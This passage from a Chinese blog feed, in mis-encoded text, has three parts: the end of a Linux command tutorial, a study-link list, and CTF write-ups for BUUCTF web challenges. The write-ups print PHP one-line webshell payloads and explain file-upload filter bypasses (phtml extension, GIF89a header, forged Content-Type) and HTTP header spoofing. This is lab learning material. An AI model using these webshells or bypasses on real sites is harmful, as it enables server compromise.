align="center">æŒ‰é€šç”¨æ•°å€¼æ¥æ’åºï¼ˆè·Ÿ-nä¸åŒï¼ŒæŠŠå€¼å½“æµ®ç‚¹æ•°æ¥æ’åºï¼Œæ”¯æŒç§‘å­¦ è®¡æ•°æ³•è¡¨ç¤ºçš„å€¼ï¼‰</td></tr></tbody></table><p>-kå’Œ-tå‚æ•°åœ¨å¯¹æŒ‰å­—æ®µåˆ†éš”çš„æ•°æ®è¿›è¡Œæ’åºæ—¶éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚/etc/passwdæ–‡ä»¶ã€‚å¯ä»¥ç”¨-tå‚æ•°æ¥æŒ‡å®šå­—æ®µåˆ†éš”ç¬¦ï¼Œç„¶åç”¨-kå‚æ•°æ¥æŒ‡å®šæ’åºçš„å­—æ®µã€‚ä¸¾ä¸ªä¾‹å­ï¼Œè¦å¯¹å‰é¢æåˆ°çš„å¯†ç æ–‡ä»¶/etc/passwdæ ¹æ®ç”¨æˆ·IDè¿›è¡Œæ•°å€¼æ’åºï¼Œå¯ä»¥è¿™ä¹ˆåšï¼š  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sort</span> -t <span class="token string">':'</span> -k <span class="token number">3</span> -n /etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/sync<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> æ­¤æ—¶æ•°æ®å·²ç»æŒ‰ç¬¬ä¸‰ä¸ªå­—æ®µâ€”â€”ç”¨æˆ·IDçš„æ•°å€¼æ’åºã€‚</p><h4 id="4-3-2-æœç´¢æ•°æ®"><a href="#4-3-2-æœç´¢æ•°æ®" class="headerlink" title="4.3.2 æœç´¢æ•°æ®"></a>4.3.2 æœç´¢æ•°æ®</h4><p>æ ¼å¼ï¼š<code>grep [options] pattern [file]  </code></p><p><code>grep</code>å‘½ä»¤ä¼šåœ¨è¾“å…¥æˆ–æŒ‡å®šçš„æ–‡ä»¶ä¸­æŸ¥æ‰¾åŒ…å«åŒ¹é…æŒ‡å®šæ¨¡å¼çš„å­—ç¬¦çš„è¡Œã€‚ grepçš„è¾“å‡ºå°±æ˜¯åŒ…å«äº†åŒ¹é…æ¨¡å¼çš„è¡Œï¼ˆå¹¶ä¸æ˜¯è¡Œå·æ˜¯ä¸€è¡Œå†…å®¹ï¼‰ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># cat test1.txt </span>teacher zhaoTeacher wangstudent liStudent qinteach himsovle itroot@VM-16-11-debian:/tmp/test<span class="token comment"># grep teacher test1.txt </span>teacher zhaoroot@VM-16-11-debian:/tmp/test<span class="token comment"># grep t test1.txt </span>teacher zhaostudent liStudent qinteach himsovle it<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>-v</code>å‚æ•°ï¼šè¿›è¡Œåå‘æœç´¢ï¼ˆè¾“å‡ºä¸åŒ¹é…è¯¥æ¨¡å¼çš„è¡Œï¼‰ ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -v t test1.txt </span>Teacher wang<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>  <code>-n</code>å‚æ•°ï¼šæ˜¾ç¤ºåŒ¹é…æ¨¡å¼çš„è¡Œæ‰€åœ¨çš„è¡Œå· ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -n t test1.txt </span><span class="token number">1</span>:teacher zhao<span class="token number">3</span>:student li<span class="token number">4</span>:Student qin<span class="token number">5</span>:teach him<span class="token number">6</span>:sovle it<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>-c</code>å‚æ•°ï¼šæ˜¾ç¤ºå¤šå°‘è¡Œå«æœ‰åŒ¹é…çš„æ¨¡å¼ ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -c t test1.txt </span><span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p> <code>-e  </code>å‚æ•°ï¼šæŒ‡å®šå¤šä¸ªåŒ¹é…æ¨¡å¼ ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@VM-16-11-debian:/tmp/test<span class="token comment"># grep -e t -e a test1.txt </span>teacher zhaoTeacher wangstudent liStudent qinteach himsovle it<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é€šç”¨çš„å¯ä»¥ä½¿ç”¨é€šé…ç¬¦ã€æ­£åˆ™è¡¨è¾¾å¼æ¥åŒ¹é…~</p><h4 id="4-3-3-å‹ç¼©æ•°æ®"><a href="#4-3-3-å‹ç¼©æ•°æ®" class="headerlink" title="4.3.3 å‹ç¼©æ•°æ®"></a>4.3.3 å‹ç¼©æ•°æ®</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">gzip</span> myprog$ <span class="token function">ls</span> -l my*-rwxrwxr-x <span class="token number">1</span> rich rich <span class="token number">2197</span> <span class="token number">2007</span>-09-13 <span class="token number">11</span>:29 myprog.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>gzipå‘½ä»¤ä¼šå‹ç¼©ä½ åœ¨å‘½ä»¤è¡ŒæŒ‡å®šçš„æ–‡ä»¶ã€‚ä¹Ÿå¯ä»¥åœ¨å‘½ä»¤è¡ŒæŒ‡å®šå¤šä¸ªæ–‡ä»¶åç”šè‡³ç”¨é€šé…ç¬¦æ¥ä¸€æ¬¡æ€§æ‰¹é‡å‹ç¼©æ–‡ä»¶ã€‚  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">gzip</span> my*$ <span class="token function">ls</span> -l my*-rwxr--r-- <span class="token number">1</span> rich rich <span class="token number">103</span> Sep <span class="token number">6</span> <span class="token number">13</span>:43 myprog.c.gz-rwxr-xr-x <span class="token number">1</span> rich rich <span class="token number">5178</span> Sep <span class="token number">6</span> <span class="token number">13</span>:43 myprog.gz-rwxr--r-- <span class="token number">1</span> rich rich <span class="token number">59</span> Sep <span class="token number">6</span> <span class="token number">13</span>:46 myscript.gz-rwxr--r-- <span class="token number">1</span> rich rich <span class="token number">60</span> Sep <span class="token number">6</span> <span class="token number">13</span>:44 myscript2.gz$<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-3-4-å½’æ¡£æ•°æ®"><a href="#4-3-4-å½’æ¡£æ•°æ®" class="headerlink" title="4.3.4 å½’æ¡£æ•°æ®"></a>4.3.4 å½’æ¡£æ•°æ®</h4><p>è™½ç„¶<code>zip</code>å‘½ä»¤èƒ½å¤Ÿå¾ˆå¥½åœ°å°†æ•°æ®å‹ç¼©å’Œå½’æ¡£è¿›å•ä¸ªæ–‡ä»¶ï¼Œä½†å®ƒä¸æ˜¯Unixå’ŒLinuxä¸­çš„æ ‡å‡†å½’æ¡£å·¥å…·ã€‚ç›®å‰ï¼Œ Unixå’ŒLinuxä¸Šæœ€å¹¿æ³›ä½¿ç”¨çš„å½’æ¡£å·¥å…·æ˜¯<code>tar</code>å‘½ä»¤ã€‚  </p><p>tarå‘½ä»¤çš„æ ¼å¼ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token keyword">function</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span> object1 object2 <span class="token punctuation">..</span>.  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>functionå‚æ•°å®šä¹‰äº†tarå‘½ä»¤åº”è¯¥åšä»€ä¹ˆ :</p><table><thead><tr><th align="center">åŠŸ èƒ½</th><th align="center">é•¿åç§°</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">-A</td><td align="center">â€“concatenate</td><td align="center">å°†ä¸€ä¸ªå·²æœ‰tarå½’æ¡£æ–‡ä»¶è¿½åŠ åˆ°å¦ä¸€ä¸ªå·²æœ‰tarå½’æ¡£æ–‡ä»¶</td></tr><tr><td align="center">-c</td><td align="center">â€“create</td><td align="center">åˆ›å»ºä¸€ä¸ªæ–°çš„tarå½’æ¡£æ–‡ä»¶</td></tr><tr><td align="center">-d</td><td align="center">â€“diff</td><td align="center">æ£€æŸ¥å½’æ¡£æ–‡ä»¶å’Œæ–‡ä»¶ç³»ç»Ÿçš„ä¸åŒä¹‹å¤„</td></tr><tr><td align="center"></td><td align="center">â€“delete</td><td align="center">ä»å·²æœ‰tarå½’æ¡£æ–‡ä»¶ä¸­åˆ é™¤</td></tr><tr><td align="center">-r</td><td align="center">â€“append</td><td align="center">è¿½åŠ æ–‡ä»¶åˆ°å·²æœ‰tarå½’æ¡£æ–‡ä»¶æœ«å°¾</td></tr><tr><td align="center">-t</td><td align="center">â€“list</td><td align="center">åˆ—å‡ºå·²æœ‰tarå½’æ¡£æ–‡ä»¶çš„å†…å®¹</td></tr><tr><td align="center">-u</td><td align="center">â€“update</td><td align="center">å°†æ¯”tarå½’æ¡£æ–‡ä»¶ä¸­å·²æœ‰çš„åŒåæ–‡ä»¶æ–°çš„æ–‡ä»¶è¿½åŠ åˆ°è¯¥tarå½’æ¡£æ–‡ä»¶ä¸­</td></tr><tr><td align="center">-x</td><td align="center">â€“extract</td><td align="center">ä»å·²æœ‰tarå½’æ¡£æ–‡ä»¶ä¸­æå–æ–‡ä»¶</td></tr></tbody></table><p>æ¯ä¸ªåŠŸèƒ½å¯ç”¨é€‰é¡¹æ¥é’ˆå¯¹tarå½’æ¡£æ–‡ä»¶å®šä¹‰ä¸€ä¸ªç‰¹å®šè¡Œä¸ºã€‚ä¸‹è¡¨åˆ—å‡ºäº†è¿™äº›é€‰é¡¹ä¸­èƒ½å’Œtar<br>å‘½ä»¤ä¸€èµ·ä½¿ç”¨çš„å¸¸è§é€‰é¡¹ğŸ¤ªã€‚  </p><table><thead><tr><th align="center">é€‰ é¡¹</th><th align="center">æ è¿°</th></tr></thead><tbody><tr><td align="center">-C dir</td><td align="center">åˆ‡æ¢åˆ°æŒ‡å®šç›®å½•</td></tr><tr><td align="center">-f file</td><td align="center">è¾“å‡ºç»“æœåˆ°æ–‡ä»¶æˆ–è®¾å¤‡file</td></tr><tr><td align="center">-j</td><td align="center">å°†è¾“å‡ºé‡å®šå‘ç»™bzip2å‘½ä»¤æ¥å‹ç¼©å†…å®¹</td></tr><tr><td align="center">-p</td><td align="center">ä¿ç•™æ‰€æœ‰æ–‡ä»¶æƒé™</td></tr><tr><td align="center">-v</td><td align="center">åœ¨å¤„ç†æ–‡ä»¶æ—¶æ˜¾ç¤ºæ–‡ä»¶</td></tr><tr><td align="center">-z</td><td align="center">å°†è¾“å‡ºé‡å®šå‘ç»™gzipå‘½ä»¤æ¥å‹ç¼©å†…å®¹</td></tr></tbody></table><p>è¿™äº›é€‰é¡¹ç»å¸¸åˆå¹¶åˆ°ä¸€èµ·ä½¿ç”¨ã€‚é¦–å…ˆï¼Œä½ å¯ä»¥ç”¨ä¸‹åˆ—å‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªå½’æ¡£æ–‡ä»¶ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -cvf test.tar test/ test2/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¸Šé¢çš„å‘½ä»¤åˆ›å»ºäº†åä¸ºtest.tarçš„å½’æ¡£æ–‡ä»¶ï¼Œå«æœ‰testå’Œtest2ç›®å½•å†…å®¹ã€‚æ¥ç€ï¼Œç”¨ä¸‹åˆ—å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -tf test.tar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åˆ—å‡ºtaræ–‡ä»¶test.tarçš„å†…å®¹ï¼ˆä½†å¹¶ä¸æå–æ–‡ä»¶ï¼‰ã€‚æœ€åï¼Œç”¨å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -xvf test.tar  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é€šè¿‡è¿™ä¸€å‘½ä»¤ä»taræ–‡ä»¶test.tarä¸­<strong>æå–å†…å®¹</strong>ã€‚å¦‚æœtaræ–‡ä»¶æ˜¯ä»ä¸€ä¸ªç›®å½•ç»“æ„åˆ›å»ºçš„ï¼Œé‚£æ•´ä¸ªç›®å½•ç»“æ„éƒ½ä¼šåœ¨å½“å‰ç›®å½•ä¸‹é‡æ–°åˆ›å»ºã€‚  </p><hr><p><strong>çªé—¨</strong> ä¸‹è½½äº†å¼€æºè½¯ä»¶ä¹‹åï¼Œä½ ä¼šç»å¸¸çœ‹åˆ°æ–‡ä»¶åä»¥.tgzç»“å°¾ã€‚è¿™äº›æ˜¯gzipå‹ç¼©è¿‡çš„taræ–‡ä»¶å¯ä»¥<br>ç”¨å‘½ä»¤tar -zxvf filename.tgzæ¥è§£å‹ã€‚</p><hr><hr><p><font color="#FF9999" size="3">æ–‡ç« å‚è€ƒï¼šLinuxå‘½ä»¤è¡Œä¸shellè„šæœ¬ç¼–ç¨‹å¤§å…¨.ç¬¬3ç‰ˆ by å¸ƒé²å§†ï¼Œå¸ƒé›·æ–¯çº³æ±‰ (z-lib.org)</font></p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/linux4/202201221842398.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="å­¦ä¹ " scheme="https://huhu-myh.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="linux" scheme="https://huhu-myh.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>ASCå­¦ä¹ </title>
    <link href="https://huhu-myh.github.io/posts/myh10009.html"/>
    <id>https://huhu-myh.github.io/posts/myh10009.html</id>
    <published>2022-01-22T07:15:38.000Z</published>
    <updated>2022-01-25T08:27:04.694Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="ä¸€ã€MPI"><a href="#ä¸€ã€MPI" class="headerlink" title="ä¸€ã€MPI"></a>ä¸€ã€MPI</h2><p>æœ¬æ¬¡å­¦ä¹ åŸºäºï¼š<a href="https://mpitutorial.com/tutorials/">https://mpitutorial.com/tutorials/</a> ï¼ŒMPIæ•™ç¨‹ã€‚</p><p><a href="https://zhuanlan.zhihu.com/p/355652501">https://zhuanlan.zhihu.com/p/355652501</a></p><h2 id="äºŒã€makeå­¦ä¹ "><a href="#äºŒã€makeå­¦ä¹ " class="headerlink" title="äºŒã€makeå­¦ä¹ "></a>äºŒã€makeå­¦ä¹ </h2><p><a href="https://www.ruanyifeng.com/blog/2015/02/make.html">https://www.ruanyifeng.com/blog/2015/02/make.html</a></p><h2 id="ä¸‰ã€cmakeå­¦ä¹ "><a href="#ä¸‰ã€cmakeå­¦ä¹ " class="headerlink" title="ä¸‰ã€cmakeå­¦ä¹ "></a>ä¸‰ã€cmakeå­¦ä¹ </h2><p><a href="https://www.hahack.com/codes/cmake/">https://www.hahack.com/codes/cmake/</a></p><h2 id="å››ã€æœºå™¨å­¦ä¹ "><a href="#å››ã€æœºå™¨å­¦ä¹ " class="headerlink" title="å››ã€æœºå™¨å­¦ä¹ "></a>å››ã€æœºå™¨å­¦ä¹ </h2><p>è§†é¢‘ï¼š<a href="https://www.bilibili.com/video/BV164411b7dx?from=search&amp;seid=13050048519173094800&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV164411b7dx?from=search&amp;seid=13050048519173094800&amp;spm_id_from=333.337.0.0</a></p><p>â€‹           <a href="https://www.coursera.org/learn/machine-learning/home/welcome">https://www.coursera.org/learn/machine-learning/home/welcome</a></p><p>ç¬”è®°ï¼š<a href="http://www.ai-start.com/ml2014/">http://www.ai-start.com/ml2014/</a></p><h2 id="äº”ã€Pytorchå­¦ä¹ "><a href="#äº”ã€Pytorchå­¦ä¹ " class="headerlink" title="äº”ã€Pytorchå­¦ä¹ "></a>äº”ã€Pytorchå­¦ä¹ </h2><p>wikiï¼š<a href="https://handbook.pytorch.wiki/">https://handbook.pytorch.wiki/</a></p><hr><p>åŠ¨æ€å­¦ä¹ ï¼Œä¸€ç‚¹ä¸€ç‚¹è¡¥~</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/ASC/202201221837341.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ASC" scheme="https://huhu-myh.github.io/categories/ASC/"/>
    
    
    <category term="MPI" scheme="https://huhu-myh.github.io/tags/MPI/"/>
    
  </entry>
  
  <entry>
    <title>buuctfç»ƒä¹ [11-20]</title>
    <link href="https://huhu-myh.github.io/posts/myh10008.html"/>
    <id>https://huhu-myh.github.io/posts/myh10008.html</id>
    <published>2022-01-19T07:07:24.000Z</published>
    <updated>2022-02-05T01:44:56.921Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="11-æå®¢å¤§æŒ‘æˆ˜-2019-Knife"><a href="#11-æå®¢å¤§æŒ‘æˆ˜-2019-Knife" class="headerlink" title="11.[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife"></a>11.[æå®¢å¤§æŒ‘æˆ˜ 2019]Knife</h2><p>é¢˜ç›®éƒ½å‘Šè¯‰äº†æ˜¯ç™½ç»™çš„shellï¼Œç›´æ¥è¿å°±å¥½äº†æ‹¿åˆ°webshellï¼Œæ‰¾åˆ°æ ¹ç›®å½•ä¸‹æœ‰ä¸ªflagï¼Œè¯»å–æ‹¿åˆ°flag:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659622.png"></p><h2 id="12-æå®¢å¤§æŒ‘æˆ˜-2019-Http"><a href="#12-æå®¢å¤§æŒ‘æˆ˜-2019-Http" class="headerlink" title="12.[æå®¢å¤§æŒ‘æˆ˜ 2019]Http"></a>12.[æå®¢å¤§æŒ‘æˆ˜ 2019]Http</h2><p>è€ƒå¯Ÿçš„ä¸»è¦æ˜¯httpå¤´éƒ¨çš„ä¸€äº›ä¿¡æ¯ï¼ŒæŒ‰ç€æ”¹å°±è¡Œäº†ã€‚é¦–å…ˆé‚£é“é¢˜è¿›å…¥ç½‘é¡µçœ‹åˆ°æºç é‡Œé¢éšè—ä¸€ä¸ªï¼š<code>Secret.php</code>ï¼Œè¿›å…¥åçœ‹åˆ°æç¤ºä¿¡æ¯ï¼š</p><p>It doesnâ€™t come from â€˜<a href="https://sycsecret.buuoj.cn&amp;/#39;%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8A%93%E5%8C%85%E6%94%B9%EF%BC%9A">https://Sycsecret.buuoj.cn'ï¼Œç›´æ¥æŠ“åŒ…æ”¹ï¼š</a></p><ul><li>åŠ ä¸ª<code>Referer</code>: <a href="https://sycsecret.buuoj.cn,/">https://Sycsecret.buuoj.cnï¼Œ</a></li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659623.png"></p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659625.png"></p><ul><li>çœ‹åˆ°åˆè¯´å¿…é¡»ä½¿ç”¨â€syclover browserâ€,æ¥ç€æ”¹<code>User-Agent</code></li></ul><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659626.png" style="zoom:150%;"><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659627.png" style="zoom:150%;"><ul><li>è¿™åˆè¯´å¿…é¡»æœ¬åœ°è®¿é—®ï¼Œå†æ”¹<code>X-Forwarded-For</code>æ‹¿åˆ°flag:</li></ul><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201191659628.png"></p><p>è¿™é‡Œè®²ä¸€ä¸‹è¿™ä¸‰ä¸ªå‚æ•°ï¼š</p><ul><li><code>Referer</code>: æµè§ˆå™¨å‘ WEB æœåŠ¡å™¨è¡¨æ˜è‡ªå·±æ˜¯ä»å“ªä¸ª ç½‘é¡µ/URL è·å¾—/ç‚¹å‡» å½“å‰è¯·æ±‚ä¸­çš„ç½‘å€/URL(ä½ ä»å“ªæ¥çš„)ã€‚</li><li><code>User-Agent</code>: æµè§ˆå™¨è¡¨æ˜è‡ªå·±çš„èº«ä»½ï¼ˆæ˜¯å“ªç§æµè§ˆå™¨ï¼‰ã€‚ </li><li><code>X-Forwarded-For</code>: è¡¨ç¤º HTTP è¯·æ±‚ç«¯çœŸå® IPã€‚</li></ul><h2 id="13-æå®¢å¤§æŒ‘æˆ˜-2019-Upload"><a href="#13-æå®¢å¤§æŒ‘æˆ˜-2019-Upload" class="headerlink" title="13.[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload"></a>13.[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</h2><p>å¥½ä¹…æ²¡åšæ–‡ä»¶ä¸Šä¼ çš„é¢˜äº†ï¼Œæœ‰ç‚¹éš¾åˆ°æˆ‘äº†ã€‚</p><p>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬è¯•è¯•ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ˜¾ç¤ºï¼šNOT IMAGEï¼Œé‚£å°±æŠ“åŒ…å…ˆæ”¹COntent-Type:<code>image/jpeg</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146199.png"></p><p>æ¥ç€è¯´ä¸èƒ½æ˜¯phpï¼Œç»•è¿‡åç¼€çš„æœ‰æ–‡ä»¶æ ¼å¼æœ‰php,php3,php4,php5,phtmlï¼Œphtmï¼Œå‰å‡ ä¸ªè¯•è¯•éƒ½ä¸è¡Œï¼Œé‚£å°±è¯•è¯•phtmlï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146202.png"></p><p>æ¥ç€æ˜¯ä¸èƒ½å«æœ‰â€™&lt;?â€™ ï¼Œé‚£å°±å†æ”¹ï¼ŒæŸ¥åˆ°äº†ä¸€ä¸ªpayload:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token double-quoted-string string">"php"</span><span class="token operator">&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span>shell<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146204.png"></p><p>æ¥ç€è¯´ä¸æ˜¯å›¾ç‰‡ï¼Œé‚£å°±æ˜¯æ£€æŸ¥äº†å¤´éƒ¨ä¿¡æ¯ï¼ŒåŠ ç‰¹å¾ä¿¡æ¯ï¼ŒæˆåŠŸä¸Šä¼ ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">?</span> <span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token double-quoted-string string">"php"</span><span class="token operator">&gt;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201146205.png"></p><p>æœ€ååœ¨è¿çš„æ—¶å€™è¦çŒœä¸€ä¸‹æ–‡ä»¶ä¸Šä¼ åˆ°å“ªé‡Œäº†ï¼<strong>å¸¸è§„çš„ç›®å½•/uploadä¸‹é¢</strong>ï¼Œç„¶åç›´æ¥è¿  /upload/2.phtml  å°±å¯ä»¥äº†</p><p>èšå‰‘è¿ä¸€ä¸‹flagå°±åœ¨æ ¹ç›®å½•ï¼Œæ‹¿åˆ°flag:flag{07b9cce3-4089-4384-a26a-4572c9c90566}ã€‚</p><p>æ€»ä½“æ€è·¯å¤§æ¦‚å°±æ˜¯å…ˆä¸Šä¼ ä¸ªé©¬ï¼Œçœ‹è¿”å›ä¿¡æ¯ï¼Œç„¶åå¯¹åº”æ”¹å°±å¯ä»¥äº†ï¼Œè¿˜æœ‰å¾ˆå¤šè¿‡æ»¤ï¼Œä»¥åæ…¢æ…¢é‡è§~</p><p>è¿™é‡Œæ¨èä¸€ç¯‡åšå®¢ï¼Œè®²è§£äº†ä¸€å¥è¯æœ¨é©¬çš„åŸç†ï¼š<a href="https://blog.csdn.net/weixin_39190897/article/details/86772765">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p><h2 id="14-ACTF2020-æ–°ç”Ÿèµ›-Upload"><a href="#14-ACTF2020-æ–°ç”Ÿèµ›-Upload" class="headerlink" title="14.[ACTF2020 æ–°ç”Ÿèµ›]Upload"></a>14.[ACTF2020 æ–°ç”Ÿèµ›]Upload</h2><p>è¿™é¢˜å’Œä¸Šé¢˜å·®ä¸å¤šï¼Œå¤šäº†ä¸€ä¸ª<strong>å‰ç«¯éªŒè¯</strong>ï¼Œæ‰€ä»¥å¯ä»¥å…ˆåˆ¶ä½œä¸€ä¸ªå›¾ç‰‡æœ¨é©¬ä¸Šä¼ æŠ“åŒ…ï¼Œç„¶åæ”¹æ–‡ä»¶åç¼€ä¸ºï¼šphtmlï¼ŒæˆåŠŸä¸Šä¼ ï¼Œç„¶åå°±å¯ä»¥ç›´æ¥è¿äº†æ‹¿åˆ°webshellï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu2/202201201639371.png"></p><p>æ‹¿åˆ°flagï¼šflag{7facc008-0a13-457f-9a24-3f63516cd0c8}</p><h2 id="15-RoarCTF-2019-Easy-Calc"><a href="#15-RoarCTF-2019-Easy-Calc" class="headerlink" title="15.[RoarCTF 2019]Easy Calc"></a>15.[RoarCTF 2019]Easy Calc</h2><p>è¿™é¢˜éš¾é“æˆ‘äº†ï¼Œé¦–å…ˆé¢˜ç›®è€ƒå¯Ÿçš„æ˜¯å‘½ä»¤æ‰§è¡Œã€‚ä½†æ˜¯è®¾ç½®äº†WAFå’Œä¸€äº›å­—ç¬¦è¿‡æ»¤ï¼Œé‡Œé¢æ¶‰åŠäº†æŒºå¤šä¸çŸ¥é“çš„çŸ¥è¯†ç‚¹ã€‚é¦–å…ˆè®¿é—®é¡µé¢æ˜¯ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œçœ‹é¡µé¢æºç çœ‹åˆ°æç¤ºè®¾ç½®äº†WAFæ¥é˜»æ­¢ä½ çš„ä¸€äº›è¾“å…¥ï¼Œè¿˜å¯ä»¥çœ‹åˆ°ä¸€ä¸ªcalc.phpï¼Œçœ‹åˆ°é‡Œé¢ä¹Ÿæœ‰ä¸€äº›åŒ¹é…é™åˆ¶ã€‚æ³¨æ„ä¸€ä¸‹ï¼Œè¿™ä¸ªWAFä¸ä»…ä»…æ˜¯è¿™ä¸ªphpè¿˜æœ‰ä½ çœ‹ä¸åˆ°çš„ï¼Œå°±æ¯”å¦‚å…ˆè¾“å…¥calc.php?num=aï¼Œå¯ä»¥çœ‹åˆ°è¿”å›403ï¼Œå› ä¸ºè¿™é‡Œè¿‡æ»¤äº†å­—æ¯ä½ 